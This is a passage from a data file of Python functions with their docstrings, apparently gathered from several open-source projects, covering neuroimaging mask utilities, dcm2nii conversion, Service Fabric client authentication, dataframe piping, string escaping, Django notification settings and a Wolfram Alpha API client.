            "def set_auth(pem=None, cert=None, key=None, aad=False):\n    \"\"\"Set certificate usage paths\"\"\"\n\n    if any([cert, key]) and pem:\n        raise ValueError('Cannot specify both pem and cert or key')\n\n    if any([cert, key]) and not all([cert, key]):\n        raise ValueError('Must specify both cert and key')\n\n    if pem:\n        set_config_value('security', 'pem')\n        set_config_value('pem_path', pem)\n    elif cert or key:\n        set_config_value('security', 'cert')\n        set_config_value('cert_path', cert)\n        set_config_value('key_path', key)\n    elif aad:\n        set_config_value('security', 'aad')\n    else:\n        set_config_value('security', 'none')"
        ],
        [
            "def filter_objlist(olist, fieldname, fieldval):\n    \"\"\"\n    Returns a list with of the objects in olist that have a fieldname valued as fieldval\n\n    Parameters\n    ----------\n    olist: list of objects\n\n    fieldname: string\n\n    fieldval: anything\n\n    Returns\n    -------\n    list of objets\n    \"\"\"\n    return [x for x in olist if getattr(x, fieldname) == fieldval]"
        ],
        [
            "def is_valid_regex(string):\n    \"\"\"\n    Checks whether the re module can compile the given regular expression.\n\n    Parameters\n    ----------\n    string: str\n\n    Returns\n    -------\n    boolean\n    \"\"\"\n    try:\n        re.compile(string)\n        is_valid = True\n    except re.error:\n        is_valid = False\n    return is_valid"
        ],
        [
            "def is_fnmatch_regex(string):\n    \"\"\"\n    Returns True if the given string is considered a fnmatch\n    regular expression, False otherwise.\n    It will look for\n\n    :param string: str\n\n    \"\"\"\n    is_regex = False\n    regex_chars = ['!', '*', '$']\n    for c in regex_chars:\n        if string.find(c) > -1:\n            return True\n    return is_regex"
        ],
        [
            "def where_is(strings, pattern, n=1, lookup_func=re.match):\n    \"\"\"Return index of the nth match found of pattern in strings\n\n    Parameters\n    ----------\n    strings: list of str\n        List of strings\n\n    pattern: str\n        Pattern to be matched\n\n    nth: int\n        Number of times the match must happen to return the item index.\n\n    lookup_func: callable\n        Function to match each item in strings to the pattern, e.g., re.match or re.search.\n\n    Returns\n    -------\n    index: int\n        Index of the nth item that matches the pattern.\n        If there are no n matches will return -1\n    \"\"\"\n    count = 0\n    for idx, item in enumerate(strings):\n        if lookup_func(pattern, item):\n            count += 1\n            if count == n:\n                return idx\n    return -1"
        ],
        [
            "def generate_config(output_directory):\n    \"\"\" Generate a dcm2nii configuration file that disable the interactive\n    mode.\n    \"\"\"\n    if not op.isdir(output_directory):\n        os.makedirs(output_directory)\n\n    config_file = op.join(output_directory, \"config.ini\")\n    open_file = open(config_file, \"w\")\n    open_file.write(\"[BOOL]\\nManualNIfTIConv=0\\n\")\n    open_file.close()\n    return config_file"
        ],
        [
            "def call_dcm2nii(work_dir, arguments=''):\n    \"\"\"Converts all DICOM files within `work_dir` into one or more\n    NifTi files by calling dcm2nii on this folder.\n\n    Parameters\n    ----------\n    work_dir: str\n        Path to the folder that contain the DICOM files\n\n    arguments: str\n        String containing all the flag arguments for `dcm2nii` CLI.\n\n    Returns\n    -------\n    sys_code: int\n        dcm2nii execution return code\n    \"\"\"\n    if not op.exists(work_dir):\n        raise IOError('Folder {} not found.'.format(work_dir))\n\n    cmd_line = 'dcm2nii {0} \"{1}\"'.format(arguments, work_dir)\n    log.info(cmd_line)\n    return subprocess.check_call(cmd_line, shell=True)"
        ],
        [
            "def convert_dcm2nii(input_dir, output_dir, filename):\n    \"\"\" Call MRICron's `dcm2nii` to convert the DICOM files inside `input_dir`\n    to Nifti and save the Nifti file in `output_dir` with a `filename` prefix.\n\n    Parameters\n    ----------\n    input_dir: str\n        Path to the folder that contains the DICOM files\n\n    output_dir: str\n        Path to the folder where to save the NifTI file\n\n    filename: str\n        Output file basename\n\n    Returns\n    -------\n    filepaths: list of str\n        List of file paths created in `output_dir`.\n    \"\"\"\n    # a few checks before doing the job\n    if not op.exists(input_dir):\n        raise IOError('Expected an existing folder in {}.'.format(input_dir))\n\n    if not op.exists(output_dir):\n        raise IOError('Expected an existing output folder in {}.'.format(output_dir))\n\n    # create a temporary folder for dcm2nii export\n    tmpdir = tempfile.TemporaryDirectory(prefix='dcm2nii_')\n\n    # call dcm2nii\n    arguments = '-o \"{}\" -i y'.format(tmpdir.name)\n    try:\n        call_out = call_dcm2nii(input_dir, arguments)\n    except:\n        raise\n    else:\n        log.info('Converted \"{}\" to nifti.'.format(input_dir))\n\n        # get the filenames of the files that dcm2nii produced\n        filenames  = glob(op.join(tmpdir.name, '*.nii*'))\n\n        # cleanup `filenames`, using only the post-processed (reoriented, cropped, etc.) images by dcm2nii\n        cleaned_filenames = remove_dcm2nii_underprocessed(filenames)\n\n        # copy files to the output_dir\n        filepaths = []\n        for srcpath in cleaned_filenames:\n            dstpath = op.join(output_dir, filename)\n            realpath = copy_w_plus(srcpath, dstpath)\n            filepaths.append(realpath)\n\n            # copy any other file produced by dcm2nii that is not a NifTI file, e.g., *.bvals, *.bvecs, etc.\n            basename = op.basename(remove_ext(srcpath))\n            aux_files = set(glob(op.join(tmpdir.name, '{}.*'     .format(basename)))) - \\\n                        set(glob(op.join(tmpdir.name, '{}.nii*'.format(basename))))\n            for aux_file in aux_files:\n                aux_dstpath = copy_w_ext(aux_file, output_dir, remove_ext(op.basename(realpath)))\n                filepaths.append(aux_dstpath)\n\n        return filepaths"
        ],
        [
            "def remove_dcm2nii_underprocessed(filepaths):\n    \"\"\" Return a subset of `filepaths`. Keep only the files that have a basename longer than the\n    others with same suffix.\n    This works based on that dcm2nii appends a preffix character for each processing\n    step it does automatically in the DICOM to NifTI conversion.\n\n    Parameters\n    ----------\n    filepaths: iterable of str\n\n    Returns\n    -------\n    cleaned_paths: iterable of str\n    \"\"\"\n    cln_flist = []\n\n    # sort them by size\n    len_sorted = sorted(filepaths, key=len)\n\n    for idx, fpath in enumerate(len_sorted):\n        remove = False\n\n        # get the basename and the rest of the files\n        fname = op.basename(fpath)\n        rest  = len_sorted[idx+1:]\n\n        # check if the basename is in the basename of the rest of the files\n        for rest_fpath in rest:\n            rest_file = op.basename(rest_fpath)\n            if rest_file.endswith(fname):\n                remove = True\n                break\n\n        if not remove:\n            cln_flist.append(fpath)\n\n    return cln_flist"
        ],
        [
            "def dictify(a_named_tuple):\n    \"\"\"Transform a named tuple into a dictionary\"\"\"\n    return dict((s, getattr(a_named_tuple, s)) for s in a_named_tuple._fields)"
        ],
        [
            "def merge_dict_of_lists(adict, indices, pop_later=True, copy=True):\n    \"\"\"Extend the within a dict of lists. The indices will indicate which\n    list have to be extended by which other list.\n\n    Parameters\n    ----------\n    adict: OrderedDict\n        An ordered dictionary of lists\n\n    indices: list or tuple of 2 iterables of int, bot having the same length\n        The indices of the lists that have to be merged, both iterables items\n         will be read pair by pair, the first is the index to the list that\n         will be extended with the list of the second index.\n         The indices can be constructed with Numpy e.g.,\n         indices = np.where(square_matrix)\n\n    pop_later: bool\n        If True will oop out the lists that are indicated in the second\n         list of indices.\n\n    copy: bool\n        If True will perform a deep copy of the input adict before\n         modifying it, hence not changing the original input.\n\n    Returns\n    -------\n    Dictionary of lists\n\n    Raises\n    ------\n    IndexError\n        If the indices are out of range\n    \"\"\"\n    def check_indices(idxs, x):\n        for i in chain(*idxs):\n            if i < 0 or i >= x:\n                raise IndexError(\"Given indices are out of dict range.\")\n\n    check_indices(indices, len(adict))\n\n    rdict = adict.copy() if copy else adict\n\n    dict_keys = list(rdict.keys())\n    for i, j in zip(*indices):\n        rdict[dict_keys[i]].extend(rdict[dict_keys[j]])\n\n    if pop_later:\n        for i, j in zip(*indices):\n            rdict.pop(dict_keys[j], '')\n\n    return rdict"
        ],
        [
            "def append_dict_values(list_of_dicts, keys=None):\n    \"\"\"\n    Return a dict of lists from a list of dicts with the same keys.\n    For each dict in list_of_dicts with look for the values of the\n    given keys and append it to the output dict.\n\n    Parameters\n    ----------\n    list_of_dicts: list of dicts\n\n    keys: list of str\n        List of keys to create in the output dict\n        If None will use all keys in the first element of list_of_dicts\n    Returns\n    -------\n    DefaultOrderedDict of lists\n    \"\"\"\n    if keys is None:\n        keys = list(list_of_dicts[0].keys())\n\n    dict_of_lists = DefaultOrderedDict(list)\n    for d in list_of_dicts:\n        for k in keys:\n            dict_of_lists[k].append(d[k])\n    return dict_of_lists"
        ],
        [
            "def import_pyfile(filepath, mod_name=None):\n    \"\"\"\n    Imports the contents of filepath as a Python module.\n\n    :param filepath: string\n\n    :param mod_name: string\n    Name of the module when imported\n\n    :return: module\n    Imported module\n    \"\"\"\n    import sys\n    if sys.version_info.major == 3:\n        import importlib.machinery\n        loader = importlib.machinery.SourceFileLoader('', filepath)\n        mod = loader.load_module(mod_name)\n    else:\n        import imp\n        mod = imp.load_source(mod_name, filepath)\n\n    return mod"
        ],
        [
            "def copy(configfile='', destpath='', overwrite=False, sub_node=''):\n    \"\"\"Copies the files in the built file tree map\n    to despath.\n\n    :param configfile: string\n     Path to the FileTreeMap config file\n\n    :param destpath: string\n     Path to the files destination\n\n    :param overwrite: bool\n     Overwrite files if they already exist.\n\n    :param sub_node: string\n     Tree map configuration sub path.\n     Will copy only the contents within this sub-node\n\n    \"\"\"\n    log.info('Running {0} {1} {2}'.format(os.path.basename(__file__),\n                                          whoami(),\n                                          locals()))\n\n    assert(os.path.isfile(configfile))\n\n    if os.path.exists(destpath):\n        if os.listdir(destpath):\n            raise FolderAlreadyExists('Folder {0} already exists. Please clean '\n                                      'it or change destpath.'.format(destpath))\n    else:\n        log.info('Creating folder {0}'.format(destpath))\n        path(destpath).makedirs_p()\n\n    from boyle.files.file_tree_map import FileTreeMap\n    file_map = FileTreeMap()\n\n    try:\n        file_map.from_config_file(configfile)\n    except Exception as e:\n        raise FileTreeMapError(str(e))\n\n    if sub_node:\n        sub_map = file_map.get_node(sub_node)\n        if not sub_map:\n            raise FileTreeMapError('Could not find sub node '\n                                   '{0}'.format(sub_node))\n\n        file_map._filetree = {}\n        file_map._filetree[sub_node] = sub_map\n\n    try:\n        file_map.copy_to(destpath, overwrite=overwrite)\n    except Exception as e:\n        raise FileTreeMapError(str(e))"
        ],
        [
            "def convert_sav(inputfile, outputfile=None, method='rpy2', otype='csv'):\n    \"\"\" Transforms the input .sav SPSS file into other format.\n    If you don't specify an outputfile, it will use the\n    inputfile and change its extension to .csv\n    \"\"\"\n    assert(os.path.isfile(inputfile))\n    assert(method=='rpy2' or method=='savread')\n\n    if method == 'rpy2':\n        df = sav_to_pandas_rpy2(inputfile)\n    elif method == 'savread':\n        df = sav_to_pandas_savreader(inputfile)\n\n    otype_exts = {'csv': '.csv', \n                  'hdf': '.h5', \n                  'stata': '.dta',\n                  'json': '.json',\n                  'pickle': '.pickle',\n                  'excel': '.xls',\n                  'html': '.html'}\n\n    if outputfile is None:\n        outputfile = inputfile.replace(path(inputfile).ext, '')\n\n    outputfile = add_extension_if_needed(outputfile, otype_exts[otype])\n\n    if otype == 'csv':\n        df.to_csv(outputfile)\n    elif otype == 'hdf':\n        df.to_hdf(outputfile, os.path.basename(outputfile))\n    elif otype == 'stata':\n        df.to_stata(outputfile)\n    elif otype == 'json':\n        df.to_json(outputfile)\n    elif otype == 'pickle':\n        df.to_pickle(outputfile)\n    elif otype == 'excel':\n        df.to_excel(outputfile)\n    elif otype == 'html':\n        df.to_html(outputfile)\n    else:\n        df.to_csv(outputfile)"
        ],
        [
            "def load_mask(image, allow_empty=True):\n    \"\"\"Load a Nifti mask volume.\n\n    Parameters\n    ----------\n    image: img-like object or boyle.nifti.NeuroImage or str\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present, raise TypeError otherwise.\n\n    allow_empty: boolean, optional\n        Allow loading an empty mask (full of 0 values)\n\n    Returns\n    -------\n    nibabel.Nifti1Image with boolean data.\n    \"\"\"\n    img    = check_img(image, make_it_3d=True)\n    values = np.unique(img.get_data())\n\n    if len(values) == 1:\n        # We accept a single value if it is not 0 (full true mask).\n        if values[0] == 0 and not allow_empty:\n            raise ValueError('Given mask is invalid because it masks all data')\n\n    elif len(values) == 2:\n        # If there are 2 different values, one of them must be 0 (background)\n        if 0 not in values:\n            raise ValueError('Background of the mask must be represented with 0.'\n                             ' Given mask contains: {}.'.format(values))\n\n    elif len(values) != 2:\n        # If there are more than 2 values, the mask is invalid\n            raise ValueError('Given mask is not made of 2 values: {}. '\n                             'Cannot interpret as true or false'.format(values))\n\n    return nib.Nifti1Image(as_ndarray(get_img_data(img), dtype=bool), img.get_affine(), img.get_header())"
        ],
        [
            "def load_mask_data(image, allow_empty=True):\n    \"\"\"Load a Nifti mask volume and return its data matrix as boolean and affine.\n\n    Parameters\n    ----------\n    image: img-like object or boyle.nifti.NeuroImage or str\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present, raise TypeError otherwise.\n\n    allow_empty: boolean, optional\n        Allow loading an empty mask (full of 0 values)\n\n    Returns\n    -------\n    numpy.ndarray with dtype==bool, numpy.ndarray of affine transformation\n    \"\"\"\n    mask = load_mask(image, allow_empty=allow_empty)\n    return get_img_data(mask), mask.get_affine()"
        ],
        [
            "def union_mask(filelist):\n    \"\"\"\n    Creates a binarised mask with the union of the files in filelist.\n\n    Parameters\n    ----------\n    filelist: list of img-like object or boyle.nifti.NeuroImage or str\n        List of paths to the volume files containing the ROIs.\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present, raise TypeError otherwise.\n\n    Returns\n    -------\n    ndarray of bools\n        Mask volume\n\n    Raises\n    ------\n    ValueError\n    \"\"\"\n    firstimg = check_img(filelist[0])\n    mask     = np.zeros_like(firstimg.get_data())\n\n    # create space for all features and read from subjects\n    try:\n        for volf in filelist:\n            roiimg = check_img(volf)\n            check_img_compatibility(firstimg, roiimg)\n            mask  += get_img_data(roiimg)\n    except Exception as exc:\n        raise ValueError('Error joining mask {} and {}.'.format(repr_imgs(firstimg), repr_imgs(volf))) from exc\n    else:\n        return as_ndarray(mask > 0, dtype=bool)"
        ],
        [
            "def apply_mask(image, mask_img):\n    \"\"\"Read a Nifti file nii_file and a mask Nifti file.\n    Returns the voxels in nii_file that are within the mask, the mask indices\n    and the mask shape.\n\n    Parameters\n    ----------\n    image: img-like object or boyle.nifti.NeuroImage or str\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present, raise TypeError otherwise.\n\n    mask_img: img-like object or boyle.nifti.NeuroImage or str\n        3D mask array: True where a voxel should be used.\n        See img description.\n\n    Returns\n    -------\n    vol[mask_indices], mask_indices\n\n    Note\n    ----\n    nii_file and mask_file must have the same shape.\n\n    Raises\n    ------\n    NiftiFilesNotCompatible, ValueError\n    \"\"\"\n    img  = check_img(image)\n    mask = check_img(mask_img)\n    check_img_compatibility(img, mask)\n\n    vol          = img.get_data()\n    mask_data, _ = load_mask_data(mask)\n\n    return vol[mask_data], mask_data"
        ],
        [
            "def apply_mask_4d(image, mask_img):  # , smooth_mm=None, remove_nans=True):\n    \"\"\"Read a Nifti file nii_file and a mask Nifti file.\n    Extract the signals in nii_file that are within the mask, the mask indices\n    and the mask shape.\n\n    Parameters\n    ----------\n    image: img-like object or boyle.nifti.NeuroImage or str\n        Can either be:\n        - a file path to a Nifti image\n        - any object with get_data() and get_affine() methods, e.g., nibabel.Nifti1Image.\n        If niimg is a string, consider it as a path to Nifti image and\n        call nibabel.load on it. If it is an object, check if get_data()\n        and get_affine() methods are present, raise TypeError otherwise.\n\n    mask_img: img-like object or boyle.nifti.NeuroImage or str\n        3D mask array: True where a voxel should be used.\n        See img description.\n\n    smooth_mm: float #TBD\n        (optional) The size in mm of the FWHM Gaussian kernel to smooth the signal.\n        If True, remove_nans is True.\n\n    remove_nans: bool #TBD\n        If remove_nans is True (default), the non-finite values (NaNs and\n        infs) found in the images will be replaced by zeros.\n\n    Returns\n    -------\n    session_series, mask_data\n\n    session_series: numpy.ndarray\n        2D array of series with shape (voxel number, image number)\n\n    Note\n    ----\n    nii_file and mask_file must have the same shape.\n\n    Raises\n    ------\n    FileNotFound, NiftiFilesNotCompatible\n    \"\"\"\n    img  = check_img(image)\n    mask = check_img(mask_img)\n    check_img_compatibility(img, mask, only_check_3d=True)\n\n    vol = get_data(img)\n    series, mask_data = _apply_mask_to_4d_data(vol, mask)\n    return series, mask_data"
        ],
        [
            "def vector_to_volume(arr, mask, order='C'):\n    \"\"\"Transform a given vector to a volume. This is a reshape function for\n    3D flattened and maybe masked vectors.\n\n    Parameters\n    ----------\n    arr: np.array\n        1-Dimensional array\n\n    mask: numpy.ndarray\n        Mask image. Must have 3 dimensions, bool dtype.\n\n    Returns\n    -------\n    np.ndarray\n    \"\"\"\n    if mask.dtype != np.bool:\n        raise ValueError(\"mask must be a boolean array\")\n\n    if arr.ndim != 1:\n        raise ValueError(\"vector must be a 1-dimensional array\")\n\n    if arr.ndim == 2 and any(v == 1 for v in arr.shape):\n        log.debug('Got an array of shape {}, flattening for my purposes.'.format(arr.shape))\n        arr = arr.flatten()\n\n    volume = np.zeros(mask.shape[:3], dtype=arr.dtype, order=order)\n    volume[mask] = arr\n    return volume"
        ],
        [
            "def matrix_to_4dvolume(arr, mask, order='C'):\n    \"\"\"Transform a given vector to a volume. This is a reshape function for\n    4D flattened masked matrices where the second dimension of the matrix\n    corresponds to the original 4th dimension.\n\n    Parameters\n    ----------\n    arr: numpy.array\n        2D numpy.array\n\n    mask: numpy.ndarray\n        Mask image. Must have 3 dimensions, bool dtype.\n\n    dtype: return type\n        If None, will get the type from vector\n\n    Returns\n    -------\n    data: numpy.ndarray\n        Unmasked data.\n        Shape: (mask.shape[0], mask.shape[1], mask.shape[2], X.shape[1])\n    \"\"\"\n    if mask.dtype != np.bool:\n        raise ValueError(\"mask must be a boolean array\")\n\n    if arr.ndim != 2:\n        raise ValueError(\"X must be a 2-dimensional array\")\n\n    if mask.sum() != arr.shape[0]:\n        # raise an error if the shape of arr is not what expected\n        raise ValueError('Expected arr of shape ({}, samples). Got {}.'.format(mask.sum(), arr.shape))\n\n    data = np.zeros(mask.shape + (arr.shape[1],), dtype=arr.dtype,\n                    order=order)\n    data[mask, :] = arr\n    return data"
        ],
        [
            "def niftilist_mask_to_array(img_filelist, mask_file=None, outdtype=None):\n    \"\"\"From the list of absolute paths to nifti files, creates a Numpy array\n    with the masked data.\n\n    Parameters\n    ----------\n    img_filelist: list of str\n        List of absolute file paths to nifti files. All nifti files must have\n        the same shape.\n\n    mask_file: str\n        Path to a Nifti mask file.\n        Should be the same shape as the files in nii_filelist.\n\n    outdtype: dtype\n        Type of the elements of the array, if not set will obtain the dtype from\n        the first nifti file.\n\n    Returns\n    -------\n    outmat:\n        Numpy array with shape N x prod(vol.shape) containing the N files as flat vectors.\n\n    mask_indices:\n        Tuple with the 3D spatial indices of the masking voxels, for reshaping\n        with vol_shape and remapping.\n\n    vol_shape:\n        Tuple with shape of the volumes, for reshaping.\n\n    \"\"\"\n    img = check_img(img_filelist[0])\n    if not outdtype:\n        outdtype = img.dtype\n\n    mask_data, _ = load_mask_data(mask_file)\n    indices      = np.where      (mask_data)\n\n    mask = check_img(mask_file)\n\n    outmat = np.zeros((len(img_filelist), np.count_nonzero(mask_data)),\n                      dtype=outdtype)\n\n    for i, img_item in enumerate(img_filelist):\n        img = check_img(img_item)\n        if not are_compatible_imgs(img, mask):\n            raise NiftiFilesNotCompatible(repr_imgs(img), repr_imgs(mask_file))\n\n        vol = get_img_data(img)\n        outmat[i, :] = vol[indices]\n\n    return outmat, mask_data"
        ],
        [
            "def create(_):\n    \"\"\"Create a client for Service Fabric APIs.\"\"\"\n\n    endpoint = client_endpoint()\n\n    if not endpoint:\n        raise CLIError(\"Connection endpoint not found. \"\n                       \"Before running sfctl commands, connect to a cluster using \"\n                       \"the 'sfctl cluster select' command.\")\n\n    no_verify = no_verify_setting()\n\n    if security_type() == 'aad':\n        auth = AdalAuthentication(no_verify)\n    else:\n        cert = cert_info()\n        ca_cert = ca_cert_info()\n        auth = ClientCertAuthentication(cert, ca_cert, no_verify)\n\n    return ServiceFabricClientAPIs(auth, base_url=endpoint)"
        ],
        [
            "def aggregate(self, clazz, new_col, *args):\n        \"\"\"\n        Aggregate the rows of the DataFrame into a single value.\n\n        :param clazz: name of a class that extends class Callable\n        :type clazz: class\n        :param new_col: name of the new column\n        :type new_col: str\n        :param args: list of column names of the object that function \n        should be applied to\n        :type args: tuple\n        :return: returns a new dataframe object with the aggregated value\n        :rtype: DataFrame\n        \"\"\"\n        if is_callable(clazz) and not is_none(new_col) and has_elements(*args):\n            return self.__do_aggregate(clazz, new_col, *args)"
        ],
        [
            "def group(*args):\n    \"\"\"\n    Pipeable grouping method.\n\n    Takes either\n      - a dataframe and a tuple of strings for grouping,\n      - a tuple of strings if a dataframe has already been piped into.\n    \n    :Example:\n        \n    group(dataframe, \"column\")\n    \n    :Example:\n    \n    dataframe >> group(\"column\")\n    \n    :param args: tuple of arguments\n    :type args: tuple\n    :return: returns a grouped dataframe object\n    :rtype: GroupedDataFrame\n    \"\"\"\n\n    if args and isinstance(args[0], dataframe.DataFrame):\n        return args[0].group(*args[1:])\n    elif not args:\n        raise ValueError(\"No arguments provided\")\n    else:\n        return pipeable.Pipeable(pipeable.PipingMethod.GROUP, *args)"
        ],
        [
            "def aggregate(*args):\n    \"\"\"\n    Pipeable aggregation method.\n    \n    Takes either \n     - a dataframe and a tuple of arguments required for aggregation,\n     - a tuple of arguments if a dataframe has already been piped into.\n    In any case one argument has to be a class that extends callable.\n\n    :Example:\n\n    aggregate(dataframe, Function, \"new_col_name\", \"old_col_name\")\n\n    :Example:\n\n    dataframe >> aggregate(Function, \"new_col_name\", \"old_col_name\")\n\n    :param args: tuple of arguments\n    :type args: tuple\n    :return: returns a dataframe object\n    :rtype: DataFrame\n    \"\"\"\n\n    if args and isinstance(args[0], dataframe.DataFrame):\n        return args[0].aggregate(args[1], args[2], *args[3:])\n    elif not args:\n        raise ValueError(\"No arguments provided\")\n    else:\n        return pipeable.Pipeable(pipeable.PipingMethod.AGGREGATE, *args)"
        ],
        [
            "def subset(*args):\n    \"\"\"\n    Pipeable subsetting method.\n\n    Takes either\n     - a dataframe and a tuple of arguments required for subsetting,\n     - a tuple of arguments if a dataframe has already been piped into.\n\n    :Example:\n        \n    subset(dataframe, \"column\")\n    \n    :Example:\n    \n    dataframe >> subset(\"column\")\n\n    :param args: tuple of arguments\n    :type args: tuple\n    :return: returns a dataframe object\n    :rtype: DataFrame\n    \"\"\"\n\n    if args and isinstance(args[0], dataframe.DataFrame):\n        return args[0].subset(*args[1:])\n    elif not args:\n        raise ValueError(\"No arguments provided\")\n    else:\n        return pipeable.Pipeable(pipeable.PipingMethod.SUBSET, *args)"
        ],
        [
            "def modify(*args):\n    \"\"\"\n    Pipeable modification method \n    \n    Takes either \n     - a dataframe and a tuple of arguments required for modification,\n     - a tuple of arguments if a dataframe has already been piped into.\n    In any case one argument has to be a class that extends callable.\n\n    :Example:\n\n    modify(dataframe, Function, \"new_col_name\", \"old_col_name\")\n    \n    :Example:\n\n    dataframe >> modify(Function, \"new_col_name\", \"old_col_name\")\n\n    :param args: tuple of arguments\n    :type args: tuple\n    :return: returns a dataframe object\n    :rtype: DataFrame\n    \"\"\"\n\n    if args and isinstance(args[0], dataframe.DataFrame):\n        return args[0].modify(args[1], args[2], *args[3:])\n    elif not args:\n        raise ValueError(\"No arguments provided\")\n    else:\n        return pipeable.Pipeable(pipeable.PipingMethod.MODIFY, *args)"
        ],
        [
            "def _escape_char(c, escape_char=ESCAPE_CHAR):\n    \"\"\"Escape a single character\"\"\"\n    buf = []\n    for byte in c.encode('utf8'):\n        buf.append(escape_char)\n        buf.append('%X' % _ord(byte))\n    return ''.join(buf)"
        ],
        [
            "def escape(to_escape, safe=SAFE, escape_char=ESCAPE_CHAR, allow_collisions=False):\n    \"\"\"Escape a string so that it only contains characters in a safe set.\n\n    Characters outside the safe list will be escaped with _%x_,\n    where %x is the hex value of the character.\n\n    If `allow_collisions` is True, occurrences of `escape_char`\n    in the input will not be escaped.\n\n    In this case, `unescape` cannot be used to reverse the transform\n    because occurrences of the escape char in the resulting string are ambiguous.\n    Only use this mode when:\n\n    1. collisions cannot occur or do not matter, and\n    2. unescape will never be called.\n\n    .. versionadded: 1.0\n        allow_collisions argument.\n        Prior to 1.0, behavior was the same as allow_collisions=False (default).\n\n    \"\"\"\n    if isinstance(to_escape, bytes):\n        # always work on text\n        to_escape = to_escape.decode('utf8')\n\n    if not isinstance(safe, set):\n        safe = set(safe)\n\n    if allow_collisions:\n        safe.add(escape_char)\n    elif escape_char in safe:\n        # escape char can't be in safe list\n        safe.remove(escape_char)\n\n    chars = []\n    for c in to_escape:\n        if c in safe:\n            chars.append(c)\n        else:\n            chars.append(_escape_char(c, escape_char))\n    return u''.join(chars)"
        ],
        [
            "def unescape(escaped, escape_char=ESCAPE_CHAR):\n    \"\"\"Unescape a string escaped with `escape`\n    \n    escape_char must be the same as that used in the call to escape.\n    \"\"\"\n    if isinstance(escaped, bytes):\n        # always work on text\n        escaped = escaped.decode('utf8')\n    \n    escape_pat = re.compile(re.escape(escape_char).encode('utf8') + b'([a-z0-9]{2})', re.IGNORECASE)\n    buf = escape_pat.subn(_unescape_char, escaped.encode('utf8'))[0]\n    return buf.decode('utf8')"
        ],
        [
            "def can_send(self, user, notice_type):\n        \"\"\"\n        Determines whether this backend is allowed to send a notification to\n        the given user and notice_type.\n        \"\"\"\n        from notification.models import NoticeSetting\n        return NoticeSetting.for_user(user, notice_type, self.medium_id).send"
        ],
        [
            "def get_formatted_messages(self, formats, label, context):\n        \"\"\"\n        Returns a dictionary with the format identifier as the key. The values are\n        are fully rendered templates with the given context.\n        \"\"\"\n        format_templates = {}\n        for fmt in formats:\n            # conditionally turn off autoescaping for .txt extensions in format\n            if fmt.endswith(\".txt\"):\n                context.autoescape = False\n            format_templates[fmt] = render_to_string((\n                \"notification/%s/%s\" % (label, fmt),\n                \"notification/%s\" % fmt), context_instance=context)\n        return format_templates"
        ],
        [
            "def copy_attributes(source, destination, ignore_patterns=[]):\n    \"\"\"\n    Copy the attributes from a source object to a destination object.\n    \"\"\"\n    for attr in _wildcard_filter(dir(source), *ignore_patterns):\n        setattr(destination, attr, getattr(source, attr))"
        ],
        [
            "def row(self, idx):\n        \"\"\"\n        Returns DataFrameRow of the DataFrame given its index.\n\n        :param idx: the index of the row in the DataFrame.\n        :return: returns a DataFrameRow\n        \"\"\"\n        return DataFrameRow(idx, [x[idx] for x in self], self.colnames)"
        ],
        [
            "def notice_settings(request):\n    \"\"\"\n    The notice settings view.\n\n    Template: :template:`notification/notice_settings.html`\n\n    Context:\n\n        notice_types\n            A list of all :model:`notification.NoticeType` objects.\n\n        notice_settings\n            A dictionary containing ``column_headers`` for each ``NOTICE_MEDIA``\n            and ``rows`` containing a list of dictionaries: ``notice_type``, a\n            :model:`notification.NoticeType` object and ``cells``, a list of\n            tuples whose first value is suitable for use in forms and the second\n            value is ``True`` or ``False`` depending on a ``request.POST``\n            variable called ``form_label``, whose valid value is ``on``.\n    \"\"\"\n    notice_types = NoticeType.objects.all()\n    settings_table = []\n    for notice_type in notice_types:\n        settings_row = []\n        for medium_id, medium_display in NOTICE_MEDIA:\n            form_label = \"%s_%s\" % (notice_type.label, medium_id)\n            setting = NoticeSetting.for_user(request.user, notice_type, medium_id)\n            if request.method == \"POST\":\n                if request.POST.get(form_label) == \"on\":\n                    if not setting.send:\n                        setting.send = True\n                        setting.save()\n                else:\n                    if setting.send:\n                        setting.send = False\n                        setting.save()\n            settings_row.append((form_label, setting.send))\n        settings_table.append({\"notice_type\": notice_type, \"cells\": settings_row})\n\n    if request.method == \"POST\":\n        next_page = request.POST.get(\"next_page\", \".\")\n        return HttpResponseRedirect(next_page)\n\n    settings = {\n        \"column_headers\": [medium_display for medium_id, medium_display in NOTICE_MEDIA],\n        \"rows\": settings_table,\n    }\n\n    return render_to_response(\"notification/notice_settings.html\", {\n        \"notice_types\": notice_types,\n        \"notice_settings\": settings,\n    }, context_instance=RequestContext(request))"
        ],
        [
            "def query(self, input = '', params = {}):\n        \"\"\"Query Wolfram Alpha and return a Result object\"\"\"\n        # Get and construct query parameters\n        # Default parameters\n        payload = {'input': input,\n                    'appid': self.appid}\n        # Additional parameters (from params), formatted for url\n        for key, value in params.items():\n            # Check if value is list or tuple type (needs to be comma joined)\n            if isinstance(value, (list, tuple)):\n                payload[key] = ','.join(value)\n            else:\n                payload[key] = value\n\n        # Catch any issues with connecting to Wolfram Alpha API\n        try:\n            r = requests.get(\"http://api.wolframalpha.com/v2/query\", params=payload)\n\n            # Raise Exception (to be returned as error)\n            if r.status_code != 200:\n                raise Exception('Invalid response status code: %s' % (r.status_code))\n            if r.encoding != 'utf-8':\n                raise Exception('Invalid encoding: %s' % (r.encoding))\n\n        except Exception, e:\n            return Result(error = e)\n\n        return Result(xml = r.text)"
        ],
        [
            "def pods(self):\n        \"\"\"Return list of all Pod objects in result\"\"\"\n        # Return empty list if xml_tree is not defined (error Result object)\n        if not self.xml_tree:\n            return []\n\n        # Create a Pod object for every pod group in xml\n        return [Pod(elem) for elem in self.xml_tree.findall('pod')]"
        ],
        [
